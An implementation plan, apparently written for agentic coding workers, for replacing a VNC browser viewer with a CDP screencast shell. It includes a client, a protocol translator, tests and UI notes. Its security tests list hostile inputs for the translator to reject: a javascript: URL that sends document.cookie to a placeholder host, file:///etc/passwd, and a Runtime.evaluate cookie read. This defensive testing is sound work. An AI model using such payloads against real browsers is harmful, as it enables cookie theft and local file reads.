# Virtual Browser Shell Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the noVNC desktop pane with a browser-shaped shell that renders CDP screencast frames of one tab, driven by a nine-message protocol that cannot express JavaScript execution or a cookie read.

**Architecture:** The runtime API becomes the only CDP speaker. A React shell talks a typed WebSocket to `/api/sessions/{id}/browser/shell`; the endpoint holds a flat CDP session against the pod's `:9222`, translates messages to CDP calls, and streams decoded JPEG frames back as binary. The control lease gates the command half exactly as `RFBClientMessageGate` gates input today.

**Tech Stack:** Python 3.12, `websockets` 16, FastAPI WebSockets, pytest with the opt-in `browser_e2e` marker (Docker + `ghcr.io/invergent-ai/surogates-agent-browser`); React 19 + Vitest in `sdk/agent-chat-react`.

**Spec:** `docs/superpowers/specs/2026-09-01-browser-shell-design.md`

## Global Constraints

- **Branch per change**, Conventional Commits, no `Co-Authored-By` trailer.
- **Never `uv run` in this repo.** Run tests as `/work/surogates/.venv/bin/python -m pytest …` from `/work/surogates`.
- Backend guard: `.venv/bin/python -m pytest tests/ -k browser -q` — 353 tests green as of `68a6704d`.
- E2E: `.venv/bin/python -m pytest -m browser_e2e tests/integration/test_browser_e2e.py -q`. Needs Docker; `docker pull ghcr.io/invergent-ai/surogates-agent-browser:latest` once.
- Frontend: `cd sdk/agent-chat-react && npm test`.
- **Page commands require a flat session.** `Page.*`, `Runtime.*` and `Input.*` return `'Page.enable' wasn't found` without one, because upstream's `devtoolsproxy` fronts 9222. Always `Target.attachToTarget({flatten: true})` and pass `sessionId`.
- **Screencast frames must be acked** (`Page.screencastFrameAck`) or Chrome stalls the stream.
- **Cap screencast dimensions.** `maxWidth: 1280, maxHeight: 800, format: "jpeg", quality: 70`. Uncapped, the native 1890×1984 viewport yields 366 KB frames instead of 74 KB.
- **This plan does not remove `BrowserEndpoint.live_view_url`.** Registry entries outlive a deploy, so that field goes in a follow-up change after the new image is in production. Removing it here breaks in-flight sessions.

## Decided during planning

The spec left the `<select>` gap open. **Accept it for v1.** `key` already carries ArrowDown/Enter, so a native dropdown stays operable while its option list is invisible. Drawing our own picker needs a server-originated DOM read and a new component; build it only if the gap proves to bite.

## File Structure

| File | Responsibility |
|---|---|
| `surogates/browser/cdp.py` *(new)* | CDP client: connect, `call()` with flat-session routing, event fan-out. No knowledge of the shell protocol. |
| `surogates/browser/shell.py` *(new)* | Protocol types, validation, and message→CDP translation. Pure: no sockets, no I/O. All security tests live here. |
| `surogates/api/routes/browser.py` | New `shell` WebSocket endpoint. Session resolution, tenant check, lease plumbing, the pump. |
| `sdk/agent-chat-react/src/components/browser/browser-shell.tsx` *(new)* | Tab strip, address bar, viewport canvas, input capture. |
| `sdk/agent-chat-react/src/components/browser/browser-pane.tsx` | Swap `BrowserLiveView` → `BrowserShell`, and give up its own header and control bar — the shell is the chrome now. |
| `sdk/agent-chat-react/src/components/browser/use-browser-control.ts` *(new)* | The take/return-control logic lifted out of `browser-control-bar.tsx`, which the shell can no longer own because it renders no dialogs. |
| `web/src/features/settings/browser-profile-setup-dialog.tsx` | Same swap. |

`cdp.py` and `shell.py` are separate because one does I/O and the other is pure — the split that makes `serialize.py` testable without a browser while `client.py` needs one.

---

### Task 1: CDP client

**Files:**
- Create: `surogates/browser/cdp.py`
- Test: `tests/test_browser_cdp.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `CdpClient` with `connect(url) -> CdpClient` (async context manager), `async call(method, params=None, session=None, timeout=10) -> dict`, `async attach_page(target_id) -> str` returning a flat sessionId, `on(method, handler)` registering an event callback, and `async targets() -> list[dict]`. Tasks 2–4 depend on these exact names.

- [ ] **Step 1: Write the failing test**

`tests/test_browser_cdp.py`:

```python
"""Tests for surogates.browser.cdp.CdpClient."""

from __future__ import annotations

import asyncio
import json

import pytest

from surogates.browser.cdp import CdpClient


class FakeSocket:
    """Stands in for a websockets connection: records sends, replays scripted frames."""

    def __init__(self, replies: dict[str, dict] | None = None) -> None:
        self.sent: list[dict] = []
        self._replies = replies or {}
        self._inbox: asyncio.Queue[str] = asyncio.Queue()

    async def send(self, raw: str) -> None:
        msg = json.loads(raw)
        self.sent.append(msg)
        canned = self._replies.get(msg["method"])
        if canned is not None:
            await self._inbox.put(json.dumps({"id": msg["id"], "result": canned}))

    async def recv(self) -> str:
        return await self._inbox.get()

    async def push(self, payload: dict) -> None:
        await self._inbox.put(json.dumps(payload))

    async def close(self) -> None:
        return None


async def test_call_correlates_reply_by_id() -> None:
    sock = FakeSocket({"Browser.getVersion": {"product": "Chrome/147"}})
    async with CdpClient(sock) as cdp:
        result = await cdp.call("Browser.getVersion")
    assert result == {"product": "Chrome/147"}
    assert sock.sent[0]["method"] == "Browser.getVersion"


async def test_page_commands_carry_the_session_id() -> None:
    # Without sessionId every Page.* call returns "'Page.enable' wasn't found",
    # because devtoolsproxy fronts 9222 and the page path behaves like a
    # browser session. The session id is not optional decoration.
    sock = FakeSocket({"Page.enable": {}})
    async with CdpClient(sock) as cdp:
        await cdp.call("Page.enable", session="SESSION123")
    assert sock.sent[0]["sessionId"] == "SESSION123"


async def test_call_raises_on_protocol_error() -> None:
    sock = FakeSocket()
    async with CdpClient(sock) as cdp:
        task = asyncio.create_task(cdp.call("Page.enable", timeout=2))
        await asyncio.sleep(0)
        await sock.push({
            "id": 1,
            "error": {"code": -32601, "message": "'Page.enable' wasn't found"},
        })
        with pytest.raises(RuntimeError, match="wasn't found"):
            await task


async def test_events_reach_registered_handlers() -> None:
    sock = FakeSocket()
    seen: list[dict] = []
    async with CdpClient(sock) as cdp:
        cdp.on("Page.screencastFrame", seen.append)
        await sock.push({
            "method": "Page.screencastFrame",
            "params": {"data": "AAA", "sessionId": "s1"},
        })
        await asyncio.sleep(0.05)
    assert seen and seen[0]["data"] == "AAA"


async def test_a_pending_call_survives_interleaved_events() -> None:
    # The pump must not mistake an event for a reply, or a screencast frame
    # arriving mid-call resolves the wrong future.
    sock = FakeSocket()
    async with CdpClient(sock) as cdp:
        task = asyncio.create_task(cdp.call("Page.enable", timeout=2))
        await asyncio.sleep(0)
        await sock.push({"method": "Page.loadEventFired", "params": {}})
        await sock.push({"id": 1, "result": {"ok": True}})
        assert await task == {"ok": True}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_browser_cdp.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'surogates.browser.cdp'`.

- [ ] **Step 3: Write minimal implementation**

`surogates/browser/cdp.py`:

```python
"""Minimal Chrome DevTools Protocol client.

The repo reaches CDP only through Playwright, by posting JavaScript to the
browser pod's ``/playwright/execute``. The browser shell has to speak it
directly: it needs a flat session, screencast events, and input dispatch on a
connection it holds open for the life of a viewer.
"""

from __future__ import annotations

import asyncio
import json
import logging
from typing import Any, Callable, Protocol

logger = logging.getLogger(__name__)


class _Socket(Protocol):
    async def send(self, raw: str) -> None: ...
    async def recv(self) -> str: ...
    async def close(self) -> None: ...


class CdpClient:
    """One CDP connection, with id-correlated calls and event fan-out."""

    def __init__(self, socket: _Socket) -> None:
        self._socket = socket
        self._next_id = 0
        self._pending: dict[int, asyncio.Future] = {}
        self._handlers: dict[str, list[Callable[[dict], None]]] = {}
        self._pump: asyncio.Task | None = None

    async def __aenter__(self) -> "CdpClient":
        self._pump = asyncio.create_task(self._read_loop())
        return self

    async def __aexit__(self, *exc: Any) -> None:
        if self._pump is not None:
            self._pump.cancel()
        for future in self._pending.values():
            if not future.done():
                future.cancel()
        await self._socket.close()

    def on(self, method: str, handler: Callable[[dict], None]) -> None:
        """Register a handler for one event method. Receives ``params``."""
        self._handlers.setdefault(method, []).append(handler)

    async def call(
        self,
        method: str,
        params: dict | None = None,
        *,
        session: str | None = None,
        timeout: float = 10.0,
    ) -> dict:
        self._next_id += 1
        message: dict[str, Any] = {
            "id": self._next_id,
            "method": method,
            "params": params or {},
        }
        # Page/Runtime/Input domains are unreachable without this: the
        # devtoolsproxy in front of :9222 makes the page path behave like a
        # browser session, so an unsessioned Page.enable is "not found".
        if session:
            message["sessionId"] = session
        future: asyncio.Future = asyncio.get_running_loop().create_future()
        self._pending[self._next_id] = future
        await self._socket.send(json.dumps(message))
        reply = await asyncio.wait_for(future, timeout)
        if "error" in reply:
            raise RuntimeError(f"{method}: {reply['error'].get('message', '?')}")
        return reply.get("result", {})

    async def targets(self) -> list[dict]:
        result = await self.call("Target.getTargets")
        return [t for t in result.get("targetInfos", []) if t.get("type") == "page"]

    async def attach_page(self, target_id: str) -> str:
        result = await self.call(
            "Target.attachToTarget", {"targetId": target_id, "flatten": True}
        )
        return result["sessionId"]

    async def _read_loop(self) -> None:
        while True:
            try:
                payload = json.loads(await self._socket.recv())
            except asyncio.CancelledError:
                raise
            except Exception:  # noqa: BLE001 - a dead socket ends the loop
                return
            message_id = payload.get("id")
            if message_id is not None:
                future = self._pending.pop(message_id, None)
                if future is not None and not future.done():
                    future.set_result(payload)
                continue
            for handler in self._handlers.get(payload.get("method", ""), ()):
                try:
                    handler(payload.get("params", {}))
                except Exception:  # noqa: BLE001 - one bad handler is not fatal
                    logger.exception("cdp event handler failed")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_browser_cdp.py -q` → 5 passed.
Run: `.venv/bin/python -m pytest tests/ -k browser -q` → 353 + 5 passed.

- [ ] **Step 5: Commit**

```bash
git add surogates/browser/cdp.py tests/test_browser_cdp.py
git commit -m "feat(browser): add a direct CDP client"
```

---

### Task 2: Protocol translation

The pure core, and where every security test lives.

**Files:**
- Create: `surogates/browser/shell.py`
- Test: `tests/test_browser_shell.py`

**Interfaces:**
- Consumes: nothing at runtime (pure).
- Produces:
  - `COMMAND_TYPES: frozenset[str]` — the message types the lease gates.
  - `translate(message: dict, *, viewport: tuple[int, int]) -> tuple[str, dict]` returning `(cdp_method, cdp_params)`.
  - `ShellProtocolError(Exception)` with `.reason`.
  - `SCREENCAST_PARAMS: dict` — the capped screencast configuration.

- [ ] **Step 1: Write the failing test**

`tests/test_browser_shell.py`:

```python
"""Tests for surogates.browser.shell — the pure message→CDP translation."""

from __future__ import annotations

import pytest

from surogates.browser.shell import (
    COMMAND_TYPES,
    SCREENCAST_PARAMS,
    ShellProtocolError,
    translate,
)

VIEWPORT = (1890, 1984)


class TestCoordinates:
    def test_click_scales_normalized_coordinates_to_the_viewport(self) -> None:
        method, params = translate(
            {"t": "click", "x": 0.5, "y": 0.25}, viewport=VIEWPORT
        )
        assert method == "Input.dispatchMouseEvent"
        assert params["x"] == 945       # 0.5 * 1890
        assert params["y"] == 496       # 0.25 * 1984

    @pytest.mark.parametrize("bad", [-0.1, 1.5, float("nan")])
    def test_out_of_range_coordinates_are_rejected(self, bad: float) -> None:
        # A client that can send x=1e9 can dispatch input outside the page.
        with pytest.raises(ShellProtocolError):
            translate({"t": "click", "x": bad, "y": 0.5}, viewport=VIEWPORT)


class TestNavigateSchemes:
    @pytest.mark.parametrize("url", [
        "https://example.com/x",
        "http://example.com",
    ])
    def test_http_and_https_are_allowed(self, url: str) -> None:
        method, params = translate(
            {"t": "navigate", "url": url}, viewport=VIEWPORT
        )
        assert method == "Page.navigate"
        assert params["url"] == url

    @pytest.mark.parametrize("url", [
        "file:///etc/passwd",
        "javascript:fetch('//x/'+document.cookie)",
        "chrome://settings",
        "devtools://devtools/bundled/inspector.html",
        "data:text/html,<script>1</script>",
        "FILE:///etc/passwd",
        "  javascript:alert(1)",
        "view-source:https://example.com",
    ])
    def test_every_other_scheme_is_rejected(self, url: str) -> None:
        # Page.navigate renders local files and executes javascript: URLs.
        # This is the one validation whose failure is a full compromise.
        with pytest.raises(ShellProtocolError):
            translate({"t": "navigate", "url": url}, viewport=VIEWPORT)


class TestVerbs:
    def test_type_uses_insert_text(self) -> None:
        # insertText handles IME, paste and non-ASCII in one call and reaches
        # contenteditable, which the xdotool-based endpoint never did.
        method, params = translate(
            {"t": "type", "text": "héllo"}, viewport=VIEWPORT
        )
        assert method == "Input.insertText"
        assert params["text"] == "héllo"

    def test_scroll_becomes_a_mouse_wheel(self) -> None:
        method, params = translate(
            {"t": "scroll", "x": 0.5, "y": 0.5, "dx": 0, "dy": 120},
            viewport=VIEWPORT,
        )
        assert method == "Input.dispatchMouseEvent"
        assert params["type"] == "mouseWheel"
        assert params["deltaY"] == 120

    def test_unknown_verb_is_rejected_without_reading_params(self) -> None:
        with pytest.raises(ShellProtocolError):
            translate(
                {"t": "Runtime.evaluate", "expression": "document.cookie"},
                viewport=VIEWPORT,
            )


class TestLeaseSurface:
    def test_every_page_acting_verb_needs_the_lease(self) -> None:
        assert COMMAND_TYPES == {
            "click", "scroll", "type", "key",
            "navigate", "back", "forward", "reload",
        }

    def test_switch_tab_is_not_lease_gated(self) -> None:
        # Switching what you watch changes no page state, so a viewer without
        # the lease may still look at another tab.
        assert "switch_tab" not in COMMAND_TYPES


class TestScreencastConfig:
    def test_frames_are_capped(self) -> None:
        # Uncapped, the native 1890x1984 viewport yields 366 KB frames against
        # 74 KB capped -- measured, not estimated.
        assert SCREENCAST_PARAMS["maxWidth"] == 1280
        assert SCREENCAST_PARAMS["maxHeight"] == 800
        assert SCREENCAST_PARAMS["format"] == "jpeg"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_browser_shell.py -q`
Expected: FAIL — `ModuleNotFoundError: No module named 'surogates.browser.shell'`.

- [ ] **Step 3: Write minimal implementation**

`surogates/browser/shell.py`:

```python
"""Browser-shell protocol: the typed messages a viewer may send, and nothing else.

Security here is structural. The viewer cannot ask the browser to run
JavaScript or read cookies because no message expresses it -- there is no
allowlist to keep exhaustively correct. The one validation that must be right
is ``navigate``: Page.navigate renders ``file://`` and executes ``javascript:``.
"""

from __future__ import annotations

import math
from urllib.parse import urlparse

# Message types that act on the page, and so require the control lease.
# ``switch_tab`` is deliberately absent: it changes what a viewer watches, not
# the page, so a viewer without the lease may still look at another tab.
COMMAND_TYPES: frozenset[str] = frozenset({
    "click", "scroll", "type", "key",
    "navigate", "back", "forward", "reload",
})

ALLOWED_SCHEMES: frozenset[str] = frozenset({"http", "https"})

# Measured: uncapped, the native 1890x1984 viewport gives 366 KB frames at
# 1328 KB/s; capped, 74 KB frames at 258 KB/s. PNG is not an option -- it
# encodes at 0.1 fps.
SCREENCAST_PARAMS: dict[str, object] = {
    "format": "jpeg",
    "quality": 70,
    "maxWidth": 1280,
    "maxHeight": 800,
    "everyNthFrame": 1,
}

MAX_TEXT = 8192


class ShellProtocolError(Exception):
    """A message the protocol does not accept. Never forwarded to CDP."""

    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


def _unit(value: object, name: str) -> float:
    try:
        number = float(value)  # type: ignore[arg-type]
    except (TypeError, ValueError):
        raise ShellProtocolError(f"{name} must be a number") from None
    if not math.isfinite(number) or not 0.0 <= number <= 1.0:
        raise ShellProtocolError(f"{name} must be between 0 and 1")
    return number


def _point(message: dict, viewport: tuple[int, int]) -> tuple[int, int]:
    width, height = viewport
    return (
        round(_unit(message.get("x"), "x") * width),
        round(_unit(message.get("y"), "y") * height),
    )


def _navigate(message: dict) -> tuple[str, dict]:
    raw = message.get("url")
    if not isinstance(raw, str) or not raw.strip():
        raise ShellProtocolError("url must be a non-empty string")
    url = raw.strip()
    scheme = urlparse(url).scheme.lower()
    if scheme not in ALLOWED_SCHEMES:
        raise ShellProtocolError(f"scheme {scheme or '(relative)'!r} is not allowed")
    return "Page.navigate", {"url": url}


def translate(message: dict, *, viewport: tuple[int, int]) -> tuple[str, dict]:
    """Map one client message to a CDP (method, params) pair.

    Raises ShellProtocolError for anything the protocol does not define. The
    params of an unknown message are never read.
    """

    kind = message.get("t")
    if kind == "click":
        x, y = _point(message, viewport)
        button = message.get("button", "left")
        if button not in {"left", "right", "middle"}:
            raise ShellProtocolError("unsupported mouse button")
        clicks = int(message.get("count", 1))
        if not 1 <= clicks <= 3:
            raise ShellProtocolError("count must be 1-3")
        return "Input.dispatchMouseEvent", {
            "type": "mousePressed", "x": x, "y": y,
            "button": button, "clickCount": clicks,
        }
    if kind == "scroll":
        x, y = _point(message, viewport)
        return "Input.dispatchMouseEvent", {
            "type": "mouseWheel", "x": x, "y": y,
            "deltaX": float(message.get("dx", 0)),
            "deltaY": float(message.get("dy", 0)),
        }
    if kind == "type":
        text = message.get("text")
        if not isinstance(text, str):
            raise ShellProtocolError("text must be a string")
        if len(text) > MAX_TEXT:
            raise ShellProtocolError("text too long")
        return "Input.insertText", {"text": text}
    if kind == "key":
        key = message.get("key")
        if not isinstance(key, str) or not key:
            raise ShellProtocolError("key must be a non-empty string")
        return "Input.dispatchKeyEvent", {"type": "rawKeyDown", "key": key}
    if kind == "navigate":
        return _navigate(message)
    if kind == "reload":
        return "Page.reload", {}
    raise ShellProtocolError(f"unsupported message type {kind!r}")
```

`back` and `forward` are not in `translate` because they need a
`Page.getNavigationHistory` round trip to resolve an entry id; the endpoint
handles them in Task 3. They stay in `COMMAND_TYPES` because the lease still
gates them.

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_browser_shell.py -q` → all passed.
Run: `.venv/bin/python -m pytest tests/ -k browser -q` → still green.

- [ ] **Step 5: Commit**

```bash
git add surogates/browser/shell.py tests/test_browser_shell.py
git commit -m "feat(browser): add the browser-shell protocol translation"
```

---

### Task 3: The WebSocket endpoint

**Files:**
- Modify: `surogates/api/routes/browser.py`
- Test: `tests/test_browser_shell_route.py`

**Interfaces:**
- Consumes: `CdpClient` (Task 1), `translate` / `COMMAND_TYPES` / `SCREENCAST_PARAMS` (Task 2), and the existing `browser_resolver`, `browser_control`, `_require_session_agent`, `_effective_live_view_user` from this module.
- Produces: `GET /api/sessions/{session_id}/browser/shell` (WebSocket), and `/sessions/{session_id}/browser/shell` for parity with the existing route pair.

- [ ] **Step 1: Write the failing test**

Read `tests/test_browser_route_ws.py` first and follow its fixture style. Then in `tests/test_browser_shell_route.py`, assert the behaviours that are the endpoint's own rather than the translation's:

```python
async def test_command_without_the_lease_is_dropped_not_forwarded(...):
    """A viewer who does not hold the lease may watch but not act."""
    # Connect, do not take control, send {"t": "click", ...}.
    # Assert: no Input.dispatchMouseEvent reached the fake CDP client, and the
    # socket stayed open -- dropping is not disconnecting.

async def test_frames_flow_without_the_lease(...):
    """Watching is never gated; only the command half is."""

async def test_switch_tab_stops_the_old_screencast_before_starting_the_new(...):
    """Ordering is the race guard: assert Page.stopScreencast precedes the
    second Page.startScreencast in the recorded call order."""

async def test_oversized_message_is_dropped(...):
    """An Input.insertText carrying megabytes is a trivial DoS."""

async def test_unknown_session_is_rejected_before_any_cdp_connection(...):
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_browser_shell_route.py -q`
Expected: FAIL — the route does not exist, so the WebSocket connect raises.

- [ ] **Step 3: Write minimal implementation**

Add to `surogates/api/routes/browser.py`, modelled on `proxy_live_view_ws`:

1. Resolve the session and tenant exactly as `proxy_live_view_ws` does; reject unknown sessions before opening any CDP socket.
2. `GET {cdp_url→http}/json/version` for `webSocketDebuggerUrl`, connect a `CdpClient`.
3. `targets()` → pick the active page → `attach_page()` → `Page.enable` → `Page.startScreencast(SCREENCAST_PARAMS, session=...)`.
4. Register handlers: `Page.screencastFrame` → `base64.b64decode` → `websocket.send_bytes` → `Page.screencastFrameAck`; `Page.frameNavigated` → `nav`; `Target.targetCreated/InfoChanged/Destroyed` → `tabs`; `Page.javascriptDialogOpening` → `dialog`.
5. Receive loop: reject frames over `MAX_WS_MESSAGE`; parse JSON; if `t in COMMAND_TYPES` and the lease is not held, drop and continue; `switch_tab` → stop old screencast, drain, re-attach, start new; `back`/`forward` → `Page.getNavigationHistory` then `Page.navigateToHistoryEntry`; otherwise `translate()` and `call()`.
6. `ShellProtocolError` → drop the message, count it, keep the socket open.
7. On CDP socket loss → close the client socket with a distinct code.

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_browser_shell_route.py -q` then `.venv/bin/python -m pytest tests/ -k browser -q`.

- [ ] **Step 5: Commit**

```bash
git add surogates/api/routes/browser.py tests/test_browser_shell_route.py
git commit -m "feat(browser): serve the browser shell over a websocket"
```

---

### Task 4: End-to-end against real Chromium

Unit tests cannot tell you a click landed. These can.

**Files:**
- Modify: `tests/integration/test_browser_e2e.py`

**Interfaces:** consumes Tasks 1–3. Produces nothing.

- [ ] **Step 1: Write the failing tests**

Append, following the existing `browser` fixture and `data:` page pattern:

```python
CLICK_TARGET_PAGE = (
    "<body style='margin:0'>"
    "<button id='b' style='position:absolute;left:25%;top:50%;"
    "width:120px;height:44px' onclick='this.textContent=\"hit\"'>miss</button>"
    "</body>"
)


async def test_shell_streams_frames_and_click_lands(browser) -> None:
    """A normalized coordinate must land on the element it points at.

    The button sits at 25% across and 50% down; a click sent as (0.27, 0.52)
    is inside it only if the server scaled by the live viewport. Getting the
    scaling wrong misses, and the label stays 'miss'.
    """


async def test_shell_switch_tab_drains_the_previous_stream(browser) -> None:
    """After switching, no frame from the old target may arrive."""


async def test_shell_navigate_rejects_file_scheme_end_to_end(browser) -> None:
    """The unit test proves translate() raises; this proves nothing downstream
    re-admits it."""
```

- [ ] **Step 2: Run to verify they fail**

Run: `.venv/bin/python -m pytest -m browser_e2e tests/integration/test_browser_e2e.py -k shell -q`

- [ ] **Step 3: Make them pass**

Fix whatever they expose. Expect the click-coordinate test to be the one that finds real bugs — it is the only check that the whole normalize→scale→dispatch chain agrees.

- [ ] **Step 4: Run the full e2e suite**

Run: `.venv/bin/python -m pytest -m browser_e2e tests/integration/test_browser_e2e.py -q` → the 10 existing cases plus the new ones.

- [ ] **Step 5: Commit**

```bash
git add tests/integration/test_browser_e2e.py
git commit -m "test(browser): drive the shell against a real browser"
```

---

### Task 5: The React shell

**Files:**
- Create: `sdk/agent-chat-react/src/components/browser/browser-shell.tsx`
- Test: `sdk/agent-chat-react/tests/browser-shell.test.tsx`

**Interfaces:**
- Produces: `<BrowserShell src={string} hasControl={boolean} onDisconnect={(clean: boolean) => void} testId?={string} />`. `browser-pane.tsx` and the profile-setup dialog both consume exactly this in Task 6.

- [ ] **Step 1: Write the failing test**

Read `tests/browser-live-view.test.tsx` for the mocking style, then assert:

```
- binary messages render to the canvas
- the tab strip lists tabs from a `tabs` message; clicking one sends switch_tab
- the tab strip is ABSENT at one tab and present at two
- a click on the viewport sends NORMALIZED coordinates (0-1), not pixels
- with hasControl=false the address bar and viewport are inert:
  no command message is sent
- the take-control icon renders the held state when hasControl=true,
  and keeps the same glyph in both states
- an unexpected socket close calls onDisconnect(false)
```

The coordinate test is the important one: it is the client half of the contract Task 4 checks server-side, and a component that sends pixels will look correct in isolation and miss every click in production.

- [ ] **Step 2: Run to verify it fails**

Run: `cd sdk/agent-chat-react && npm test -- browser-shell`

- [ ] **Step 3: Implement**

The layout is settled — see *Shell chrome* in the spec and the [canvas](https://claude.ai/code/artifact/3e9cda62-2a1e-4534-9f8a-8f2d52f79709). Build exactly that:

```
44px toolbar   ‹  ›  ⟳  ⊹   [ ● en.wikipedia.org/wiki/Kubernetes ]  ⋯
34px tab strip [ Wikipedia ] [ Stripe Docs ] [ Inbox ]     ← only when tabs > 1
     canvas
```

Measurements, matching the components it replaces: bars `bg-card` with
`border-line`, `px-2.5`, `gap-1.5`; icon buttons 26px with 14px lucide glyphs;
the URL field 28px, `rounded-md`, `bg-background`, `border-line`, `text-[11px]`
with the origin in `text-foreground` and the path in `text-muted-foreground`;
tabs 24px, `rounded`, `text-[11px]`, `max-w-33`, active tab `bg-secondary`.

Three states carry real behaviour:

- **Take control** keeps the `MousePointer2` glyph in both states and fills
  amber (`bg-primary text-primary-foreground`) when held. Do **not** swap to
  `RotateCcw` as `browser-control-bar.tsx` does — beside Reload it reads as a
  second refresh button.
- **Control held** also puts a 2px amber inset ring on the canvas and a
  "You have control · click to return" pill at the foot of the page area.
- **Tab strip** renders only at two or more tabs. The viewport jumps 34px when
  it appears; that is accepted, not a bug to smooth over.

Binary frames become an `ImageBitmap` via `createImageBitmap(blob)`, drawn
scaled to fit; pointer and keyboard handlers divide by the canvas's rendered
size to normalize. Do **not** reuse noVNC's zoom approach — the scaling bug it
works around does not exist here, because coordinates are normalized rather
than pixel-mapped.

- [ ] **Step 4: Run tests**

Run: `cd sdk/agent-chat-react && npm test` and `npm run typecheck` if present.

- [ ] **Step 5: Commit**

```bash
git add sdk/agent-chat-react/src/components/browser/browser-shell.tsx \
        sdk/agent-chat-react/tests/browser-shell.test.tsx
git commit -m "feat(browser): add the browser shell component"
```

---

### Task 6: Move both consumers, and absorb the pane's chrome

The chosen layout removes the pane's header row and its control bar — the shell
is now the chrome. Their **logic** must survive the markup: `browser-control-bar.tsx`
owns `toggleControl()` with its adapter calls, pending and error state, and the
Close `ConfirmDialog`, and none of that is presentation.

**Files:**
- Create: `sdk/agent-chat-react/src/components/browser/use-browser-control.ts` — the hook lifted out of `browser-control-bar.tsx`: `{hasControl, pending, error, toggleControl}`
- Modify: `sdk/agent-chat-react/src/components/browser/browser-pane.tsx` — drop the header row and `<BrowserControlBar>`, render `<BrowserShell>` in the full pane, keep the Close `ConfirmDialog` and `fullscreenOpen` state here
- Modify: `web/src/features/settings/browser-profile-setup-dialog.tsx`
- Modify: `sdk/agent-chat-react/src/index.ts` — export `BrowserShell`
- Delete: `sdk/agent-chat-react/src/components/browser/browser-control-bar.tsx` (only consumer is the pane, verified)
- Test: `tests/browser-pane.test.tsx`, `tests/browser-control-bar.test.tsx` if present

**Interfaces:**
- Consumes `<BrowserShell>` from Task 5, extended with `onToggleControl`, `onClose` and `onMaximize` — the `⋯` menu items and the take-control icon call these; the shell renders no dialogs of its own.
- Produces `useBrowserControl(adapter, sessionId)`.

- [ ] **Step 1: Update the pane test to expect the shell**

Assert the shell renders, the old header and control bar do not, and that
`⋯` → Close still opens the confirm dialog. Run it, watch it fail.

- [ ] **Step 2: Lift the hook, then swap both call sites**

Move the control logic verbatim into `use-browser-control.ts` — do not rewrite
it while moving it, or a behaviour change hides inside a refactor. The shell
takes a WebSocket URL; both consumers already build a live-view URL from
`liveViewPath`, so build the shell URL the same way against the new route.

- [ ] **Step 3: Run both suites**

`cd sdk/agent-chat-react && npm test`, then the web app's typecheck. Per the SDK
symlink, `web` needs an SDK build before its typecheck resolves the new export.

- [ ] **Step 4: Commit**

```bash
git commit -am "feat(browser): render the shell in the chat pane and profile setup"
```

---

### Task 7: Delete the VNC path

Only after Tasks 1–6 are green. This is the change that removes the desktop.

**Files:**
- Delete: `sdk/agent-chat-react/src/components/browser/browser-live-view.tsx`, `sdk/agent-chat-react/tests/browser-live-view.test.tsx`, `sdk/agent-chat-react/src/novnc.d.ts`, `surogates/browser/rfb.py`, `tests/test_browser_rfb.py`, `images/browser/supervisor/x11vnc.conf`, `images/browser/supervisor/websockify.conf`, `images/browser/test_live_view_rfb.py`
- Modify: `sdk/agent-chat-react/package.json` **and** `web/package.json` — drop `@novnc/novnc` from both; `images/browser/Dockerfile` — drop `x11vnc websockify` from the apt line and the two `COPY` lines; `surogates/api/routes/browser.py` — remove the `RFBClientMessageGate` import and its use.

`@novnc/novnc` is declared in both manifests because the api-image web-build installs only `web`'s lockfile and symlinks it into the SDK; removing it from one leaves the other resolving a package that is no longer there.

- [ ] **Step 1: Delete, and run everything**

```bash
.venv/bin/python -m pytest tests/ -k browser -q
cd sdk/agent-chat-react && npm test
```

Expected: green. Any failure names a live-view reference the earlier tasks missed.

- [ ] **Step 2: Rebuild the image and prove the shell still works**

```bash
docker build -f images/browser/Dockerfile -t surogates-agent-browser:no-vnc .
BROWSER_E2E_IMAGE=surogates-agent-browser:no-vnc \
  .venv/bin/python -m pytest -m browser_e2e tests/integration/test_browser_e2e.py -q
```

Expected: green, including the pre-existing screenshot and iframe cases — they go through Playwright, not the framebuffer, so removing the viewer must not touch them. This is the step that proves the deletion is safe.

- [ ] **Step 3: Confirm nothing still references the removed pieces**

```bash
grep -rn "novnc\|x11vnc\|websockify\|RFBClientMessageGate\|BrowserLiveView\|BrowserControlBar" \
  --include=*.py --include=*.ts --include=*.tsx --include=*.json \
  --include=Dockerfile --include=*.conf \
  surogates/ sdk/ web/src/ images/ tests/ | grep -v node_modules
```

Expected: no output. `live_view_url` and `live_view_path` legitimately remain — they go in the follow-up, after the new image is deployed.

- [ ] **Step 4: Commit**

```bash
git commit -am "refactor(browser): remove the VNC live view"
```

---

### Task 8: Measure the result, then open the PR

- [ ] **Step 1: Re-measure idle and scrolling through the real endpoint**

The spec's numbers came from a probe hitting the pod over localhost. Re-measure through the API WebSocket, with the lease held, on Wikipedia: idle for 10s, then scrolling for 10s. The claim to check is that idle stays near 7 KB/s rather than regressing to a poll.

- [ ] **Step 2: Look at it**

Take over a session, click a link, type into a search box, switch tabs, use back and forward. Latency and fidelity are not testable in CI and this is the only step that covers them.

- [ ] **Step 3: Open the PR**

Body carries: the before/after idle and scrolling figures from Step 1, the deleted surface, and the known gaps from the spec (`<select>`, file-upload logins, JS dialogs). State plainly that this repo runs **no CI checks on branches**, so the local runs are the whole verification.

---

## Self-Review

